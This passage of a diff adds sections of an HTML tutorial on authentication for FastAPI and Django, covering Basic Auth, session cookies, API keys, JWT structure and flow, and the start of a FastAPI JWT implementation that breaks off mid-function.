+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(16,185,129,.2);color:var(--a3)">2</div><div class="sv2"></div></div><div class="sc"><div class="stitle">Alice starts a call (AuthZ check)</div><div class="sbody">Alice sends <code>POST /api/call/start</code> with her JWT. FastAPI decodes the JWT, sees <code>role: "user"</code>. Allowed — returns LiveKit token to join room.</div></div></div>
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(245,158,11,.2);color:var(--a4)">3</div><div class="sv2"></div></div><div class="sc"><div class="stitle">Alice tries to access admin panel (AuthZ fail)</div><div class="sbody">Alice sends <code>GET /api/admin/users</code> with her JWT. FastAPI decodes it — role is <code>user</code>, not <code>admin</code>. Returns <strong>403 Forbidden</strong>. Authentication passed, authorization failed.</div></div></div>
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(244,63,94,.2);color:var(--a5)">4</div></div><div class="sc"><div class="stitle">Token expires (AuthN fail on re-request)</div><div class="sbody">Alice's JWT expires after 1 hour. Her next request returns <strong>401 Unauthorized</strong>. Frontend detects this and uses the refresh token to get a new access token silently.</div></div></div>
+  </div>
+</section>
+
+<!-- ═══ AUTH COMPARE ═══ -->
+<section id="sec-auth-compare" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 4 · Key Comparison</div>
+    <h1 class="htitle">All Auth Methods <span>Compared</span></h1>
+    <p class="hsub">There are many ways to implement authentication. Each has different trade-offs for security, scalability, and developer experience.</p>
+  </div>
+  <div class="tw"><table>
+    <thead><tr><th>Method</th><th>Storage</th><th>Stateless?</th><th>Revocable?</th><th>Best for</th><th>Avoid when</th></tr></thead>
+    <tbody>
+      <tr><td>Basic Auth</td><td>Server (none)</td><td><span class="pill p3">Yes</span></td><td><span class="pill p3">Yes</span></td><td>Internal tools, CLI, simple APIs</td><td>Public apps, production APIs</td></tr>
+      <tr><td>Session + Cookie</td><td>Server (DB/Redis)</td><td><span class="pill p5">No</span></td><td><span class="pill p3">Yes</span></td><td>Traditional web apps, Django</td><td>Mobile apps, microservices</td></tr>
+      <tr><td>API Keys</td><td>Server (DB)</td><td><span class="pill p3">Yes</span></td><td><span class="pill p3">Yes</span></td><td>Service-to-service, developer APIs</td><td>User-facing browser apps</td></tr>
+      <tr><td>JWT (Access Token)</td><td>Client only</td><td><span class="pill p3">Yes</span></td><td><span class="pill p5">Hard</span></td><td>SPAs, microservices, mobile</td><td>When instant revocation is critical</td></tr>
+      <tr><td>JWT + Refresh Token</td><td>Client + DB (refresh)</td><td><span class="pill p4">Mostly</span></td><td><span class="pill p3">Yes</span></td><td>Most modern applications</td><td>Ultra-simple projects</td></tr>
+      <tr><td>OAuth 2.0</td><td>Auth server</td><td><span class="pill p4">Depends</span></td><td><span class="pill p3">Yes</span></td><td>Social login, third-party access</td><td>Internal-only auth without SSO need</td></tr>
+      <tr><td>OpenID Connect</td><td>Auth server</td><td><span class="pill p3">Yes</span></td><td><span class="pill p3">Yes</span></td><td>Enterprise SSO, identity federation</td><td>Simple apps that don't need SSO</td></tr>
+      <tr><td>SAML 2.0</td><td>XML assertions</td><td><span class="pill p3">Yes</span></td><td><span class="pill p3">Yes</span></td><td>Enterprise (LDAP/AD integration)</td><td>New projects (use OIDC instead)</td></tr>
+      <tr><td>mTLS</td><td>Certificates</td><td><span class="pill p3">Yes</span></td><td><span class="pill p3">Yes</span></td><td>Internal microservices, zero-trust</td><td>Public APIs with many clients</td></tr>
+    </tbody>
+  </table></div>
+  <div class="callout q3"><strong>For your stack (FastAPI + Django + HTML/JS):</strong> Use JWT with refresh tokens for user-facing APIs, API keys for service-to-service calls, and session + cookie (Django built-in) for traditional server-rendered pages. Combine with OAuth for social login.</div>
+</section>
+
+<!-- ═══ BASIC AUTH ═══ -->
+<section id="sec-basic-auth" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 5 · Classic Auth</div>
+    <h1 class="htitle">Basic <span>Authentication</span></h1>
+    <p class="hsub">The simplest authentication method — username and password encoded in every request header. Simple to implement, but dangerous without HTTPS and limited in features.</p>
+  </div>
+
+  <h2>How Basic Auth works</h2>
+  <div class="flow">
+    <div class="fr">
+      <div class="fbox" style="background:rgba(0,212,255,.1);border-color:rgba(0,212,255,.3);color:var(--a1)">Client</div>
+      <div class="fa">──Authorization: Basic base64(user:pass)──▶</div>
+      <div class="fbox" style="background:rgba(16,185,129,.1);border-color:rgba(16,185,129,.3);color:var(--a3)">Server</div>
+      <div class="fa">◀──200 or 401──</div>
+    </div>
+  </div>
+  <div class="callout q5"><strong>Base64 is NOT encryption.</strong> <code>dXNlcjpwYXNz</code> decodes instantly to <code>user:pass</code>. Basic Auth transmits credentials in plaintext — always require HTTPS. Never use it over HTTP.</div>
+
+  <div class="clabel">basic_auth_fastapi.py — FastAPI</div>
+  <div class="code"><span class="k">from</span> fastapi <span class="k">import</span> FastAPI, Depends, HTTPException, status
+<span class="k">from</span> fastapi.security <span class="k">import</span> HTTPBasic, HTTPBasicCredentials
+<span class="k">import</span> secrets
+
+app = <span class="f">FastAPI</span>()
+security = <span class="f">HTTPBasic</span>()
+
+<span class="k">def</span> <span class="f">verify_basic</span>(credentials: HTTPBasicCredentials = <span class="f">Depends</span>(security)):
+    <span class="c"># Use secrets.compare_digest to prevent timing attacks</span>
+    ok_user = secrets.<span class="f">compare_digest</span>(credentials.username, <span class="s">"admin"</span>)
+    ok_pass = secrets.<span class="f">compare_digest</span>(credentials.password, <span class="s">"supersecret"</span>)
+    <span class="k">if not</span> (ok_user <span class="k">and</span> ok_pass):
+        <span class="k">raise</span> <span class="f">HTTPException</span>(
+            status_code=status.HTTP_401_UNAUTHORIZED,
+            detail=<span class="s">"Invalid credentials"</span>,
+            headers={<span class="s">"WWW-Authenticate"</span>: <span class="s">"Basic"</span>},
+        )
+    <span class="k">return</span> credentials.username
+
+<span class="f">@app.get</span>(<span class="s">"/protected"</span>)
+<span class="k">def</span> <span class="f">protected_route</span>(user: str = <span class="f">Depends</span>(verify_basic)):
+    <span class="k">return</span> {<span class="s">"message"</span>: <span class="s">f"Hello {user}"</span>}</div>
+
+  <div class="dd">
+    <div class="do"><h4>✅ When to use Basic Auth</h4><ul>
+      <li>Internal admin tools behind VPN</li>
+      <li>CLI tools for developers</li>
+      <li>Simple health-check endpoints</li>
+      <li>When simplicity is more important than features</li>
+    </ul></div>
+    <div class="dont"><h4>❌ When NOT to use Basic Auth</h4><ul>
+      <li>Public-facing APIs</li>
+      <li>Mobile or browser apps (credentials stored insecurely)</li>
+      <li>Any endpoint over HTTP (no HTTPS)</li>
+      <li>When you need token expiration or revocation</li>
+    </ul></div>
+  </div>
+</section>
+
+<!-- ═══ SESSIONS & COOKIES ═══ -->
+<section id="sec-sessions-cookies" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 6 · Classic Auth</div>
+    <h1 class="htitle">Sessions &amp; <span>Cookies</span></h1>
+    <p class="hsub">The original solution to HTTP statelessness. Server stores session data; client holds only a session ID in a cookie. Used by Django out of the box. Excellent for server-rendered web apps.</p>
+  </div>
+
+  <h2>Session auth flow</h2>
+  <div class="steps">
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(0,212,255,.2);color:var(--a1)">1</div><div class="sv2"></div></div><div class="sc"><div class="stitle">User submits login form</div><div class="sbody">Browser sends <code>POST /login</code> with username + password in the request body.</div></div></div>
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(16,185,129,.2);color:var(--a3)">2</div><div class="sv2"></div></div><div class="sc"><div class="stitle">Server validates and creates session</div><div class="sbody">Server verifies credentials, creates a session record in DB/Redis with <code>session_id → {user_id, created_at, data}</code>. Returns <code>Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Lax</code>.</div></div></div>
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(245,158,11,.2);color:var(--a4)">3</div><div class="sv2"></div></div><div class="sc"><div class="stitle">Browser stores cookie automatically</div><div class="sbody">Browser stores the cookie and sends it automatically on every subsequent request to the same domain. No JavaScript needed for this.</div></div></div>
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(124,58,237,.2);color:var(--a2)">4</div></div><div class="sc"><div class="stitle">Server looks up session on every request</div><div class="sbody">Server receives <code>Cookie: sessionid=abc123</code>, looks up that ID in Redis/DB, retrieves user data, and processes the request. Logout = delete the session record.</div></div></div>
+  </div>
+
+  <h2>Cookie security flags — ALL are important</h2>
+  <div class="tw"><table>
+    <thead><tr><th>Flag</th><th>What it does</th><th>Always use?</th></tr></thead>
+    <tbody>
+      <tr><td>HttpOnly</td><td>Cookie cannot be read by JavaScript (document.cookie)</td><td><span class="pill p3">Yes — always</span></td></tr>
+      <tr><td>Secure</td><td>Cookie only sent over HTTPS, never HTTP</td><td><span class="pill p3">Yes in production</span></td></tr>
+      <tr><td>SameSite=Strict</td><td>Cookie not sent on cross-site requests (maximum CSRF protection)</td><td><span class="pill p4">Most cases</span></td></tr>
+      <tr><td>SameSite=Lax</td><td>Cookie sent on top-level navigation but not AJAX cross-site</td><td><span class="pill p4">Good default</span></td></tr>
+      <tr><td>SameSite=None</td><td>Cookie sent cross-site (requires Secure)</td><td><span class="pill p5">Only if needed for 3rd party</span></td></tr>
+      <tr><td>Max-Age / Expires</td><td>When the cookie expires</td><td><span class="pill p3">Always set</span></td></tr>
+      <tr><td>Path=/</td><td>Cookie sent for all paths under domain</td><td><span class="pill p3">Usually</span></td></tr>
+    </tbody>
+  </table></div>
+
+  <div class="clabel">Django — Session Auth (built-in)</div>
+  <div class="code"><span class="c"># settings.py — Django session config</span>
+SESSION_ENGINE = <span class="s">'django.contrib.sessions.backends.db'</span>  <span class="c"># or cache, file</span>
+SESSION_COOKIE_HTTPONLY = <span class="n">True</span>    <span class="c"># Block JS from reading cookie</span>
+SESSION_COOKIE_SECURE = <span class="n">True</span>     <span class="c"># HTTPS only (set False for dev)</span>
+SESSION_COOKIE_SAMESITE = <span class="s">'Lax'</span>  <span class="c"># CSRF protection</span>
+SESSION_COOKIE_AGE = <span class="n">3600</span>        <span class="c"># 1 hour</span>
+SESSION_EXPIRE_AT_BROWSER_CLOSE = <span class="n">False</span>
+
+<span class="c"># views.py — Login view</span>
+<span class="k">from</span> django.contrib.auth <span class="k">import</span> authenticate, login, logout
+<span class="k">from</span> django.http <span class="k">import</span> JsonResponse
+
+<span class="k">def</span> <span class="f">login_view</span>(request):
+    <span class="k">if</span> request.method == <span class="s">'POST'</span>:
+        data = json.<span class="f">loads</span>(request.body)
+        user = <span class="f">authenticate</span>(username=data[<span class="s">'username'</span>], password=data[<span class="s">'password'</span>])
+        <span class="k">if</span> user:
+            <span class="f">login</span>(request, user)  <span class="c"># Creates session, sets cookie</span>
+            <span class="k">return</span> <span class="f">JsonResponse</span>({<span class="s">'status'</span>: <span class="s">'ok'</span>, <span class="s">'user'</span>: user.username})
+        <span class="k">return</span> <span class="f">JsonResponse</span>({<span class="s">'error'</span>: <span class="s">'Invalid credentials'</span>}, status=<span class="n">401</span>)
+
+<span class="k">def</span> <span class="f">logout_view</span>(request):
+    <span class="f">logout</span>(request)  <span class="c"># Deletes session from DB, clears cookie</span>
+    <span class="k">return</span> <span class="f">JsonResponse</span>({<span class="s">'status'</span>: <span class="s">'logged out'</span>})
+
+<span class="c"># Protect a view with login_required</span>
+<span class="k">from</span> django.contrib.auth.decorators <span class="k">import</span> login_required
+
+<span class="f">@login_required</span>
+<span class="k">def</span> <span class="f">protected_view</span>(request):
+    <span class="k">return</span> <span class="f">JsonResponse</span>({<span class="s">'user'</span>: request.user.username})</div>
+
+  <div class="callout q2"><strong>Sessions scale poorly.</strong> Every server must access the same session store (Redis). If you have multiple backend instances (Azure load balancer), they all need to share Redis. JWTs avoid this entirely because the token itself carries the state.</div>
+</section>
+
+<!-- ═══ API KEYS ═══ -->
+<section id="sec-api-keys" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 7 · Classic Auth</div>
+    <h1 class="htitle">API <span>Keys</span></h1>
+    <p class="hsub">API keys are long, random, opaque strings that act as a secret identifier for a service or user. The simplest form of machine-to-machine authentication.</p>
+  </div>
+
+  <h2>API Key best practices</h2>
+  <div class="g2">
+    <div class="card ca1"><div class="ct">Key format</div><div class="cb">Use <strong>32–64 bytes</strong> of cryptographically random data, base64url-encoded. Prefix with a namespace for easy identification: <code>sk_live_aBcD1234...</code>. Never use UUIDs — they have only 122 bits of entropy; crypto random gives 256.</div></div>
+    <div class="card ca3"><div class="ct">Storage</div><div class="cb">Store a <strong>hash</strong> of the key in your database, not the plaintext key. Use SHA-256 or bcrypt. On validation, hash the incoming key and compare hashes. This way a DB breach doesn't leak all keys.</div></div>
+    <div class="card ca4"><div class="ct">Transmission</div><div class="cb">Always in headers: <code>X-API-Key: sk_live_xxx</code> or <code>Authorization: Bearer sk_live_xxx</code>. Never in query params — they get logged by Nginx, Azure, CDNs, and browser history.</div></div>
+    <div class="card ca5"><div class="ct">Rotation</div><div class="cb">Support multiple active keys per client so they can rotate without downtime. Provide a <code>/api/keys/rotate</code> endpoint. Set expiry dates. Send email warnings before expiry.</div></div>
+  </div>
+
+  <div class="clabel">api_key_fastapi.py — Full Implementation</div>
+  <div class="code"><span class="k">import</span> secrets, hashlib
+<span class="k">from</span> fastapi <span class="k">import</span> FastAPI, Depends, HTTPException, Header
+<span class="k">from</span> sqlalchemy.orm <span class="k">import</span> Session
+
+<span class="c"># ─── Generate a new API key ────────────────────────────────────────────</span>
+<span class="k">def</span> <span class="f">generate_api_key</span>() -> tuple[str, str]:
+    raw = secrets.<span class="f">token_urlsafe</span>(<span class="n">32</span>)          <span class="c"># e.g. "aB3xK9..."</span>
+    key = <span class="s">f"sk_live_{raw}"</span>                    <span class="c"># prefixed for identification</span>
+    key_hash = hashlib.<span class="f">sha256</span>(key.<span class="f">encode</span>()).<span class="f">hexdigest</span>()
+    <span class="k">return</span> key, key_hash                       <span class="c"># store hash, give key to user</span>
+
+<span class="c"># ─── Validate incoming API key ─────────────────────────────────────────</span>
+<span class="k">async def</span> <span class="f">verify_api_key</span>(
+    x_api_key: str = <span class="f">Header</span>(..., alias=<span class="s">"X-API-Key"</span>),
+    db: Session = <span class="f">Depends</span>(get_db)
+):
+    key_hash = hashlib.<span class="f">sha256</span>(x_api_key.<span class="f">encode</span>()).<span class="f">hexdigest</span>()
+    api_key_record = db.<span class="f">query</span>(APIKey).<span class="f">filter</span>(
+        APIKey.key_hash == key_hash,
+        APIKey.is_active == <span class="n">True</span>
+    ).<span class="f">first</span>()
+    <span class="k">if not</span> api_key_record:
+        <span class="k">raise</span> <span class="f">HTTPException</span>(status_code=<span class="n">403</span>, detail=<span class="s">"Invalid API key"</span>)
+    <span class="k">return</span> api_key_record.service_name
+
+<span class="c"># ─── Protected endpoint ────────────────────────────────────────────────</span>
+<span class="f">@app.post</span>(<span class="s">"/api/internal/process"</span>)
+<span class="k">async def</span> <span class="f">process</span>(service: str = <span class="f">Depends</span>(verify_api_key)):
+    <span class="k">return</span> {<span class="s">"processed_by"</span>: service}</div>
+</section>
+
+<!-- ═══ JWT INTRO ═══ -->
+<section id="sec-jwt-intro" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 8 · JWT Deep Dive</div>
+    <h1 class="htitle">What is <span>JWT</span>?</h1>
+    <p class="hsub">JSON Web Token (JWT) is a compact, self-contained token format that carries claims (data) in a cryptographically signed package. The server can verify a JWT without a database lookup — this is what makes it powerful for stateless, scalable APIs.</p>
+  </div>
+
+  <div class="stats">
+    <div class="stat"><div class="sl">Standard</div><div class="sv" style="color:var(--a1)">RFC 7519</div></div>
+    <div class="stat"><div class="sl">Parts</div><div class="sv" style="color:var(--a3)">3 (Header.Payload.Sig)</div></div>
+    <div class="stat"><div class="sl">Default algo</div><div class="sv" style="color:var(--a2)">HS256 / RS256</div></div>
+    <div class="stat"><div class="sl">Typical size</div><div class="sv" style="color:var(--a4)">200–500 bytes</div></div>
+  </div>
+
+  <h2>JWT vs Session: the fundamental difference</h2>
+  <div class="cmp">
+    <div class="cmpc"><h3 style="color:var(--a5)">Session Cookies</h3>
+      <ul>
+        <li>Session ID stored on server (DB/Redis)</li>
+        <li>Every request requires a DB lookup</li>
+        <li>Easy to invalidate (just delete record)</li>
+        <li>Server stores all state — scales poorly</li>
+        <li>Session hijacking = attacker gets your ID</li>
+        <li>Works great for monolithic Django apps</li>
+      </ul>
+    </div>
+    <div class="cmpc"><h3 style="color:var(--a1)">JWT Tokens</h3>
+      <ul>
+        <li>All data inside the token itself</li>
+        <li>Server only verifies signature (no DB)</li>
+        <li>Hard to invalidate before expiry</li>
+        <li>Stateless — any server can verify</li>
+        <li>Token theft = attacker can use until expiry</li>
+        <li>Works great for APIs, SPAs, microservices</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="callout q1"><strong>The big JWT trade-off:</strong> JWTs are stateless and scalable, but they <strong>cannot be instantly revoked</strong>. If a user logs out or changes their password, their existing JWT remains valid until it expires. The solution: use short-lived access tokens (15–60 min) + revocable refresh tokens stored in DB.</div>
+</section>
+
+<!-- ═══ JWT STRUCTURE ═══ -->
+<section id="sec-jwt-structure" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 9 · JWT Deep Dive</div>
+    <h1 class="htitle">JWT <span>Structure</span></h1>
+    <p class="hsub">A JWT is three base64url-encoded JSON objects separated by dots: <code>header.payload.signature</code>. Understanding each part is essential to working with JWTs correctly.</p>
+  </div>
+
+  <h2>The three parts</h2>
+  <div class="callout q1"><strong>A real JWT looks like:</strong><br><code style="font-size:10px;word-break:break-all;color:var(--a1)">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</code><code style="color:var(--t3)">.</code><code style="font-size:10px;word-break:break-all;color:var(--a3)">eyJzdWIiOiJ1c2VyXzEyMyIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzAwMDAwMDAwfQ</code><code style="color:var(--t3)">.</code><code style="font-size:10px;word-break:break-all;color:var(--a5)">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</code></div>
+
+  <div class="layers">
+    <div class="layer" style="border-color:var(--a1);background:rgba(0,212,255,.04)">
+      <div class="lname" style="color:var(--a1)">Part 1: Header (blue) — Algorithm declaration</div>
+      <div class="ldesc">Decodes to: <code>{"alg": "HS256", "typ": "JWT"}</code> — declares which algorithm was used to sign the token. <strong>alg</strong> can be HS256 (symmetric), RS256 (asymmetric), ES256 (elliptic curve).</div>
+    </div>
+    <div class="layer" style="border-color:var(--a3);background:rgba(16,185,129,.04)">
+      <div class="lname" style="color:var(--a3)">Part 2: Payload (green) — Claims / data</div>
+      <div class="ldesc">Decodes to: <code>{"sub": "user_123", "role": "admin", "exp": 1700000000, "iat": 1699996400}</code> — the data you store. <strong>Not encrypted — anyone can read it</strong>. Never put passwords or secrets here.</div>
+    </div>
+    <div class="layer" style="border-color:var(--a5);background:rgba(244,63,94,.04)">
+      <div class="lname" style="color:var(--a5)">Part 3: Signature (red) — Integrity guarantee</div>
+      <div class="ldesc">HMACSHA256(base64(header) + "." + base64(payload), secret). If anyone tampers with the header or payload, the signature won't match and the token is rejected.</div>
+    </div>
+  </div>
+
+  <h2>Standard JWT claims (RFC 7519)</h2>
+  <div class="tw"><table>
+    <thead><tr><th>Claim</th><th>Full Name</th><th>Type</th><th>Purpose</th></tr></thead>
+    <tbody>
+      <tr><td>sub</td><td>Subject</td><td>string</td><td>Identifies the user: user ID, email</td></tr>
+      <tr><td>exp</td><td>Expiration Time</td><td>Unix timestamp</td><td>Token invalid after this time — always set this</td></tr>
+      <tr><td>iat</td><td>Issued At</td><td>Unix timestamp</td><td>When token was created</td></tr>
+      <tr><td>nbf</td><td>Not Before</td><td>Unix timestamp</td><td>Token invalid before this time</td></tr>
+      <tr><td>iss</td><td>Issuer</td><td>string</td><td>Who issued the token: "https://yourapp.com"</td></tr>
+      <tr><td>aud</td><td>Audience</td><td>string/array</td><td>Who the token is intended for</td></tr>
+      <tr><td>jti</td><td>JWT ID</td><td>string</td><td>Unique ID for the token (used for blacklisting)</td></tr>
+    </tbody>
+  </table></div>
+
+  <h2>Signing algorithms compared</h2>
+  <div class="tw"><table>
+    <thead><tr><th>Algorithm</th><th>Type</th><th>Key</th><th>Use when</th></tr></thead>
+    <tbody>
+      <tr><td>HS256</td><td>Symmetric HMAC</td><td>One shared secret</td><td>Single-service — simple, fast. Same key signs and verifies.</td></tr>
+      <tr><td>HS512</td><td>Symmetric HMAC</td><td>One shared secret</td><td>Same as HS256 but stronger hash. Use for higher security.</td></tr>
+      <tr><td>RS256</td><td>Asymmetric RSA</td><td>Private + Public key pair</td><td>Microservices — private key signs, public key verifies. Services don't share secrets.</td></tr>
+      <tr><td>ES256</td><td>Asymmetric ECDSA</td><td>Private + Public key pair</td><td>Same as RS256 but shorter key for same security. Preferred for mobile.</td></tr>
+    </tbody>
+  </table></div>
+  <div class="callout q4"><strong>HS256 for your stack:</strong> If you have one FastAPI backend and one frontend, HS256 is fine. If you have multiple services (FastAPI + Django + microservices), use RS256 so each service can verify tokens with the public key without accessing the private key.</div>
+</section>
+
+<!-- ═══ JWT FLOW ═══ -->
+<section id="sec-jwt-flow" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 10 · JWT Deep Dive</div>
+    <h1 class="htitle">JWT Auth <span>Flow</span></h1>
+    <p class="hsub">The complete lifecycle of a JWT — from login to protected resource access to token refresh.</p>
+  </div>
+
+  <h2>Complete JWT auth flow</h2>
+  <div class="steps">
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(0,212,255,.2);color:var(--a1)">1</div><div class="sv2"></div></div><div class="sc"><div class="stitle">Login — POST /api/auth/login</div><div class="sbody">Client sends <code>{"username": "alice", "password": "secret"}</code>. Server verifies password hash against DB. On success, creates access token (15min) and refresh token (7 days).</div></div></div>
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(16,185,129,.2);color:var(--a3)">2</div><div class="sv2"></div></div><div class="sc"><div class="stitle">Server responds with tokens</div><div class="sbody">Returns <code>{"access_token": "eyJ...", "refresh_token": "eyJ...", "token_type": "bearer"}</code>. Client stores access token in memory or localStorage (risky — see token storage section). Stores refresh token in HttpOnly cookie.</div></div></div>
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(245,158,11,.2);color:var(--a4)">3</div><div class="sv2"></div></div><div class="sc"><div class="stitle">Client uses access token</div><div class="sbody">Every API call includes <code>Authorization: Bearer eyJ...</code>. Server decodes JWT, verifies signature and expiry — no DB query needed. Extracts user_id and role from payload.</div></div></div>
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(244,63,94,.2);color:var(--a5)">4</div><div class="sv2"></div></div><div class="sc"><div class="stitle">Access token expires (401 returned)</div><div class="sbody">After 15 minutes, any request returns 401. Client detects this, automatically sends refresh token to <code>POST /api/auth/refresh</code>.</div></div></div>
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(124,58,237,.2);color:var(--a2)">5</div><div class="sv2"></div></div><div class="sc"><div class="stitle">New access token issued (silent refresh)</div><div class="sbody">Server validates refresh token (checks DB — refresh tokens are stored). Issues new access token. Client retries the original request. User experiences no interruption.</div></div></div>
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(6,182,212,.2);color:var(--a6)">6</div></div><div class="sc"><div class="stitle">Logout — DELETE /api/auth/logout</div><div class="sbody">Server deletes the refresh token from DB (now it can't be used to get new access tokens). The access token is still technically valid until it expires — this is why short expiry is important. Add to blacklist if needed.</div></div></div>
+  </div>
+
+  <div class="flow">
+    <div class="fr" style="flex-direction:column;gap:8px;align-items:flex-start">
+      <div style="display:flex;align-items:center;gap:8px">
+        <div class="fbox" style="background:rgba(0,212,255,.1);border-color:rgba(0,212,255,.3);color:var(--a1);width:90px">Frontend</div>
+        <div class="fa">──POST /login {user, pass}──────────────────────────▶</div>
+        <div class="fbox" style="background:rgba(16,185,129,.1);border-color:rgba(16,185,129,.3);color:var(--a3);width:120px">FastAPI Backend</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:8px">
+        <div class="fbox" style="background:rgba(0,212,255,.1);border-color:rgba(0,212,255,.3);color:var(--a1);width:90px">Frontend</div>
+        <div class="fa">◀─{access_token, refresh_token}─────────────────────</div>
+        <div class="fbox" style="background:rgba(16,185,129,.1);border-color:rgba(16,185,129,.3);color:var(--a3);width:120px">FastAPI Backend</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:8px">
+        <div class="fbox" style="background:rgba(0,212,255,.1);border-color:rgba(0,212,255,.3);color:var(--a1);width:90px">Frontend</div>
+        <div class="fa">──GET /api/data {Authorization: Bearer &lt;access&gt;}─────▶</div>
+        <div class="fbox" style="background:rgba(16,185,129,.1);border-color:rgba(16,185,129,.3);color:var(--a3);width:120px">FastAPI Backend</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:8px">
+        <div class="fbox" style="background:rgba(0,212,255,.1);border-color:rgba(0,212,255,.3);color:var(--a1);width:90px">Frontend</div>
+        <div class="fa">◀─200 {data}─────────────────────────────────────────</div>
+        <div class="fbox" style="background:rgba(16,185,129,.1);border-color:rgba(16,185,129,.3);color:var(--a3);width:120px">FastAPI Backend</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ JWT FASTAPI ═══ -->
+<section id="sec-jwt-fastapi" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 11 · Build It</div>
+    <h1 class="htitle">JWT in <span>FastAPI</span></h1>
+    <p class="hsub">Complete production-ready JWT implementation for FastAPI with login, protected routes, role checking, and token refresh.</p>
+  </div>
+
+  <div class="clabel">requirements — pip install these</div>
+  <div class="code">pip install fastapi uvicorn python-jose[cryptography] passlib[bcrypt] python-multipart sqlalchemy</div>
+
+  <div class="clabel">auth/config.py — JWT settings</div>
+  <div class="code"><span class="k">import</span> os
+<span class="k">from</span> datetime <span class="k">import</span> timedelta
+
+SECRET_KEY = os.<span class="f">getenv</span>(<span class="s">"JWT_SECRET_KEY"</span>, <span class="s">"CHANGE-ME-IN-PRODUCTION"</span>)
+ALGORITHM = <span class="s">"HS256"</span>
+ACCESS_TOKEN_EXPIRE = timedelta(minutes=<span class="n">15</span>)   <span class="c"># Short — 15 minutes</span>
+REFRESH_TOKEN_EXPIRE = timedelta(days=<span class="n">7</span>)       <span class="c"># Longer — 7 days</span></div>
+
+  <div class="clabel">auth/utils.py — Token creation and verification</div>
+  <div class="code"><span class="k">from</span> datetime <span class="k">import</span> datetime, timedelta, timezone
+<span class="k">from</span> typing <span class="k">import</span> Optional
+<span class="k">from</span> jose <span class="k">import</span> JWTError, jwt
+<span class="k">from</span> passlib.context <span class="k">import</span> CryptContext
+<span class="k">from</span> fastapi <span class="k">import</span> HTTPException, status
+<span class="k">from</span> .config <span class="k">import</span> SECRET_KEY, ALGORITHM
+
+pwd_context = <span class="f">CryptContext</span>(schemes=[<span class="s">"bcrypt"</span>], deprecated=<span class="s">"auto"</span>)
+
+<span class="c"># ─── Password utilities ───────────────────────────────────────────────────</span>
+<span class="k">def</span> <span class="f">hash_password</span>(password: str) -> str:
+    <span class="k">return</span> pwd_context.<span class="f">hash</span>(password)
+
+<span class="k">def</span> <span class="f">verify_password</span>(plain: str, hashed: str) -> bool:
+    <span class="k">return</span> pwd_context.<span class="f">verify</span>(plain, hashed)
+
+<span class="c"># ─── Token creation ───────────────────────────────────────────────────────</span>
+<span class="k">def</span> <span class="f">create_access_token</span>(data: dict, expires_delta: Optional[timedelta] = <span class="n">None</span>):
+    to_encode = data.<span class="f">copy</span>()
+    expire = datetime.<span class="f">now</span>(timezone.utc) + (expires_delta <span class="k">or</span> timedelta(minutes=<span class="n">15</span>))
+    to_encode.<span class="f">update</span>({<span class="s">"exp"</span>: expire, <span class="s">"type"</span>: <span class="s">"access"</span>})
+    <span class="k">return</span> jwt.<span class="f">encode</span>(to_encode, SECRET_KEY, algorithm=ALGORITHM)
+
+<span class="k">def</span> <span class="f">create_refresh_token</span>(data: dict):
+    to_encode = data.<span class="f">copy</span>()
+    expire = datetime.<span class="f">now</span>(timezone.utc) + timedelta(days=<span class="n">7</span>)
+    to_encode.<span class="f">update</span>({<span class="s">"exp"</span>: expire, <span class="s">"type"</span>: <span class="s">"refresh"</span>})
+    <span class="k">return</span> jwt.<span class="f">encode</span>(to_encode, SECRET_KEY, algorithm=ALGORITHM)
+
+<span class="c"># ─── Token verification ───────────────────────────────────────────────────</span>
+<span class="k">def</span> <span class="f">decode_token</span>(token: str) -> dict:
+    <span class="k">try</span>:
+        payload = jwt.<span class="f">decode</span>(token, SECRET_KEY, algorithms=[ALGORITHM])
+        <span class="k">return</span> payload
+    <span class="k">except</span> JWTError:
+        <span class="k">raise</span> <span class="f">HTTPException</span>(
+            status_code=status.HTTP_401_UNAUTHORIZED,
+            detail=<span class="s">"Token invalid or expired"</span>,
+            headers={<span class="s">"WWW-Authenticate"</span>: <span class="s">"Bearer"</span>}
+        )</div>
+
+  <div class="clabel">auth/dependencies.py — Reusable FastAPI dependencies</div>
+  <div class="code"><span class="k">from</span> fastapi <span class="k">import</span> Depends, HTTPException
+<span class="k">from</span> fastapi.security <span class="k">import</span> OAuth2PasswordBearer
+<span class="k">from</span> .utils <span class="k">import</span> decode_token
+<span class="k">from</span> ..database <span class="k">import</span> get_db
+
+oauth2_scheme = <span class="f">OAuth2PasswordBearer</span>(tokenUrl=<span class="s">"/api/auth/login"</span>)
+
+<span class="k">async def</span> <span class="f">get_current_user</span>(
